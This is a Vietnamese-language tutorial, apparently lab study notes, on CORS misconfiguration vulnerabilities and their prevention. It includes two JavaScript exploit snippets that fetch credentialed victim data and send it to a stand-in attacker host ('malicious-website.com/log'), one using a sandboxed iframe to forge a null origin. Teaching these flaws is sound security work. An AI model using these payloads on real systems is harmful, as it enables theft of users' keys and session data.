# Cross-origin resource sharing (CORS)

## What is CORS (cross-origin resource sharing)?

- Cross-origin resource sharing (CORS) , là một cơ chế trình duyệt cho phép truy cập có kiểm soát vào các tài nguyên nằm bên ngoài một miền nhất định.
- Nó mở rộng và thêm tính linh hoạt cho chính sách cùng nguồn gốc ( SOP ). Tuy nhiên, nó cũng tiềm ẩn nguy cơ cross-domain attacks nếu chính sách CORS của trang web được cấu hình và triển khai kém. CORS không phải là biện pháp bảo vệ chống lại cross-origin attacks như CSRF.


## Same-origin policy.

- Same-origin policy (SOP) là một đặc tả nguồn gốc chéo hạn chế giới hạn khả năng trang web tương tác với các tài nguyên bên ngoài miền nguồn.  Nó thường cho phép một miền đưa ra yêu cầu đến các miền khác, nhưng không cho phép truy cập các phản hồi. Là một cơ chế bảo mật của trình duyệt web nhằm mục đích ngăn các trang web tấn công lẫn nhau.

- Khi trình duyệt gửi một yêu cầu HTTP từ web này đến web khác, bất kỳ cookie nào, bao gồm cả cookie phiên xác thực, có liên quan đến miền khác cũng được gửi như một phần của yêu cầu. Điều này có nghĩa là phản hồi sẽ được tạo trong phiên của người dùng và bao gồm mọi dữ liệu liên quan dành riêng cho người dùng.

## Relaxation of the same-origin policy.

- Chính sách cùng nguồn gốc là rất hạn chế và do đó, nhiều cách tiếp cận khác nhau đã được đưa ra để vượt qua các hạn chế. Nhiều trang web tương tác với các tên miền phụ hoặc các trang web của bên thứ ba theo cách yêu cầu toàn quyền truy cập nguồn gốc chéo. Có thể nới lỏng có kiểm soát đối với SOP bằng cách sử dụng chia sẻ tài nguyên có nguồn gốc chéo (CORS).

- [CORS and ACAO.](acao.md)

## Vulnerabilities arising from CORS configuration issues.

- Một số ứng dụng cần cung cấp quyền truy cập vào một số miền khác. Việc duy trì danh sách các miền được phép đòi hỏi nỗ lực liên tục và bất kỳ sai sót nào đều có nguy cơ phá vỡ chức năng. Vì vậy, một số ứng dụng cho phép truy cập hiệu quả từ bất kỳ miền nào khác.

- Bởi vì ứng dụng cho phép nguồn gốc tùy ý trong *Access-Control-Allow-Origin*, điều này có nghĩa là hoàn toàn bất kỳ miền nào cũng có thể truy cập tài nguyên từ miền dễ bị tấn công. Nếu phản hồi chứa bất kỳ thông tin nhạy cảm nào như khóa API hoặc mã thông báo CSRF , bạn có thể truy xuất thông tin này bằng cách đặt tập lệnh sau trên trang web của mình:

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
```
- Lab :
	+ Lab: CORS vulnerability with basic origin reflection.[exploit](exploit/lab1.txt)

### Server-generated ACAO header from client-specified Origin header.

### Errors parsing Origin headers.
	
- Một số ứng dụng hỗ trợ truy cập từ nhiều origin làm như vậy bằng cách sử dụng whitelist . Khi nhận được yêu cầu CORS, origin sẽ được so sánh với whitelist. Nếu origin xuất hiện trên whitelist thì nó sẽ được phản ánh trong *Access-Control-Allow-Origin* để quyền truy cập được cấp.

- Sai lầm thường phát sinh khi triển khai whitelist origin CORS. Một số tổ chức cho phép truy cập từ tất cả các miền phụ của họ, và một số cho phép truy cập từ nhiều miền của các tổ chức khác bao gồm cả miền phụ. Các quy tắc này thường được triển khai bằng cách đối sánh tiền tố hoặc hậu tố URL hoặc sử dụng biểu thức chính quy. Bất kỳ sai lầm nào trong quá trình triển khai đều có thể dẫn đến việc cấp quyền truy cập cho các miền bên ngoài ngoài ý muốn.

### Whitelisted null origin value.

- Origin : null :
	+ Chuyển hướng nhiều nguồn gốc.
	+ Yêu cầu từ dữ liệu tuần tự.
	+ Yêu cầu sử dụng file://.
	+ Yêu cầu cross-origin trong sandbox.

- Trong tình huống này, kẻ tấn công có thể sử dụng nhiều thủ thuật khác nhau để tạo ra một yêu cầu cross-site có *Origin : null*.

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
``` 

-Lab:
	+ Lab: CORS vulnerability with trusted null origin.[exploit](exploit/lab2.txt)

### Exploiting XSS via CORS trust relationships.

- Ngay cả khi CORS được cấu hình đúng cũng dễ bị tấn công , nếu nguồn gốc tin cậy dễ bị tấn công XSS , thì kẻ tấn công có thể khai thác XSS để đưa JavaScript sử dụng CORS để truy xuất thông tin nhạy cảm từ trang web nạn nhân.

Request:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Response:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
Exploit : https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>

### Breaking TLS with poorly configured CORS.

Request:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Response:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
- Trong tình huống này, kẻ tấn công đang ở vị trí chặn lưu lượng truy cập của người dùng nạn nhân có thể khai thác cấu hình CORS để xâm phạm sự tương tác của nạn nhân với ứng dụng.
	+ Nạn nhân thực hiện yêu cầu HTTP > Kẻ tấn công đưa ra một chuyển hướng đến: http://trusted-subdomain.vulnerable-website.com
	+ Trình duyệt của nạn nhân chuyển hướng > Kẻ tấn công chặn yêu cầu HTTP và trả về phản hồi giả mạo có chứa yêu cầu CORS tới:https://vulnerable-website.com
	+ Trình duyệt của nạn nhân thực hiện yêu cầu CORS có Origin: http://trusted-subdomain.vulnerable-website.com
	+ Ứng dụng cho phép yêu cầu vì đây là origin trong danh sách trắng > Dữ liệu nhạy cảm được trả lại trong phản hồi.
	+ Trang giả mạo của kẻ tấn công có thể đọc dữ liệu nhạy cảm và truyền nó đến bất kỳ miền nào dưới sự kiểm soát của kẻ tấn công.

- Lab:
	+ Lab: CORS vulnerability with trusted insecure protocols.[exploit](exploit/lab3.txt)

### Intranets and CORS without credentials.

- Nếu không có header *Access-Control-Allow-Credentials: true* , trình duyệt của người dùng nạn nhân sẽ từ chối gửi cookie của họ, có nghĩa là kẻ tấn công sẽ chỉ có quyền truy cập vào nội dung chưa được xác thực.

- Tuy nhiên, có một tình huống mà kẻ tấn công không thể truy cập trực tiếp vào trang web: khi nó là một phần của mạng nội bộ của tổ chức và nằm trong không gian địa chỉ IP riêng. Các trang web nội bộ thường có tiêu chuẩn bảo mật thấp hơn các trang web bên ngoài, cho phép những kẻ tấn công tìm thấy lỗ hổng và truy cập sâu hơn. 

Request:
```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```
Response:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

- Máy chủ ứng dụng đang tin cậy các yêu cầu tài nguyên từ bất kỳ nguồn gốc nào mà không có thông tin xác thực. Nếu người dùng trong không gian địa chỉ IP riêng truy cập internet công cộng thì một cuộc tấn công dựa trên CORS có thể được thực hiện từ trang web bên ngoài sử dụng trình duyệt của nạn nhân làm proxy để truy cập tài nguyên mạng nội bộ.

-Lab:
	+ Lab: CORS vulnerability with internal network pivot attack.[exploit](exploit/lab4.txt)

## How to prevent CORS-based attacks.

- Proper configuration of cross-origin requests.
- Only allow trusted sites.
- Avoid whitelisting null.
- Avoid wildcards in internal networks.
- CORS is not a substitute for server-side security policies.
